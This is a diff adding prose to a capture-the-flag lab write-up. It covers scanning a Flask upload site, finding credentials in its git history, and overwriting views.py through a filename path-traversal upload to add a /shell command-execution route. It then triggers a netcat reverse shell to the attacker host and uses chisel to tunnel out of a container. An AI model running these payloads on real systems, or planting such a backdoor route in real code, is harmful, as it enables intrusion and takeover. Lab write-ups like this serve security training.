@@ -1,3 +1,10 @@
+
+### Tools: Feroxbuster, php
+
+### Vulnerabilities: PHP, GIT Pre-commit Cron Job
+
+nmap finds a webpage and a port 3000 open. Lets checkout the webpage first and run feroxbuster.
+
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.59.80
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 11:39 CDT
@@ -57,6 +64,7 @@ PORT   STATE SERVICE VERSION
 |_    </html>
 |_http-title: upcloud - Upload files for Free!
 |_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+3000/tcp filtered ppp
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port80-TCP:V=7.92%I=7%D=9/28%Time=633478D3%P=x86_64-pc-linux-gnu%r(GetR
 SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
@@ -98,6 +106,28 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 107.36 seconds
 ```
+
+The main webpage gives us a file to download and an upload page to visit.
+
+With file uploads maybe we can create a reverse shell but more on that later.
+
+
+feroxbuster found a console page and led me down a small rabbit hole of changing the werkzeug pin as well as a possible SSTI.
+
+```
+└─$ feroxbuster -u http://10.129.59.80/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
+200      GET       40l       81w     1360c http://10.129.59.80/
+308      GET        5l       22w      243c http://10.129.59.80/uploads => http://10.129.59.80/uploads/
+200      GET       45l      144w     1563c http://10.129.59.80/console
+```
+
+The downloaded files give us the sourcecode for how the webpage is ran. It also has a hidden .git folder which usually has some goodies in it.
+
+From the .git we run git branch to find the directories. Public was uninteresting. Dev was hiding some credentials ```http://dev01:Soulless_Developer#2022@10.10.10.128:5187/``` in its updated file ```a76f8f75f7a4a12b706b0cf9c983796fa1985820```
+
+However I was unable to use these with SSH. So we can save it for later. 
+
+This same commit also shows views.py was changed.
 
 ```console
 └─$ git log                                                 
@@ -155,13 +185,6 @@ Date:   Thu Apr 28 13:45:17 2022 +0200
 
     initial
                                                                                                  
-└─$ git cat-file a76f8f75f7a4a12b706b0cf9c983796fa1985820 -p
-tree e57842ccd63e316712011d87445a9022e83576e9
-parent ee9d9f1ef9156c787d53074493e39ae364cd1e05
-author gituser <gituser@local> 1651146376 +0200
-committer gituser <gituser@local> 1651146376 +0200
-
-updated
                                                                                                  
 └─$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820       
 commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
@@ -214,10 +237,101 @@ index f2744c6..0f3cc37 100644
               
 ```
 
+
+From our the downloaded source file we can find the views.py in /app/app/views.py. Our next step is going to be to edit the script with a reverse shell and upload it to the webpage.
+
+We are going to add below ```@app.route('/uploads/')``` our own @app.route but for a shell.
+
+```python
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+
+@app.route('/shell')
+def cmd():
+    return os.system(request.args.get('cmd'))
+```
+
+Next we want to capture the file upload in burpsuite and change the filename to ```filename="/app/app/views.py"``` so it overwrites the original file.
+
+```
+POST / HTTP/1.1
+Host: 10.129.59.80
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------163374653417435939443851688529
+Content-Length: 998
+Origin: http://10.129.59.80
+Connection: close
+Referer: http://10.129.59.80/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------163374653417435939443851688529
+Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
+Content-Type: text/x-python
+
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+
+@app.route('/shell')
+def cmd():
+    return os.system(request.args.get('cmd'))
+```
+
+Finally we are going to capture the reverse shell with curl
+
+
 ```console
 └─$ curl 'http://10.129.59.80/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.16.10%201234%20>/tmp/f'
 ```
+If you did everything correctly you will be connected, but something is off. We are already root but there are no flags :/
 
+In a turn of events that which we did not see coming we have been trapped in something dark and twisted....A container
+
+Pretty much this is not the real host. Remember that port 3000 we found awhile back? Thats what we are going to use in tandem with the IP listed below.
 
 ```console
 └─$ nc -lvnp 1234         
@@ -246,6 +360,19 @@ lo        Link encap:Local Loopback
 /app # 
 ```
 
+Set up chisel on your host and then transfer a chisel from github to the victim machine.
+
+I used linux_amd64
+
+https://github.com/jpillora/chisel/releases
+
+```console
+└─$ chisel server --reverse --port 1235
+2022/09/28 12:56:55 server: Reverse tunnelling enabled
+2022/09/28 12:56:55 server: Fingerprint IB4SYWjs+ZoSz0EbcEqeidyUQzC2u4ZFaK0b33bw8/Q=
+2022/09/28 12:56:55 server: Listening on http://0.0.0.0:1235
+```
+
 ```console
 /tmp # wget http://10.10.16.10:8000/chisel2
 Connecting to 10.10.16.10:8000 (10.10.16.10:8000)
@@ -255,21 +382,18 @@ chisel2               13% |****                            | 1036k  0:00:13 ETA
 chisel2               70% |**********************          | 5543k  0:00:01 ETA
 chisel2              100% |********************************| 7888k  0:00:00 ETA
 'chisel2' saved
-/tmp # chmod 777 chisel2
-/tmp # ./chisel2 client 10.10.16.10:1235 R:3000:172.17.0.4:3000
+```
+
+Then launch chisel from the victim.
+
+Note: Be sure to change to victim IP to 172.17.0.1 (My ifconfig says 172.17.0.4) since you want to 1st IP on the container.
+
+```console
+/tmp # ./chisel2 client 10.10.16.10:1235 R:3000:172.17.0.1:3000
 2022/09/28 17:45:59 client: Connecting to ws://10.10.16.10:1235
 2022/09/28 17:46:00 client: Connected (Latency 30.852349ms)
 ```
 
-
-```console
-└─$ chisel server --reverse --port 1235
-2022/09/28 12:34:38 server: Reverse tunnelling enabled
-2022/09/28 12:34:38 server: Fingerprint aIrjqcFNJGoCQA0Rl/A8Dl271nI2BLhRTESYFhCErYA=
-2022/09/28 12:34:38 server: Listening on http://0.0.0.0:1235
-2022/09/28 12:45:59 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
-2022/09/28 12:45:59 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
-```
 ![image](https://user-images.githubusercontent.com/105310322/192855531-f9c67260-c0e6-49b5-ba14-2fd2b1bbc01f.png)
 
 ![image](https://user-images.githubusercontent.com/105310322/192855746-a5fe127e-5ec6-474e-a9fb-995fc8f0c9bd.png)
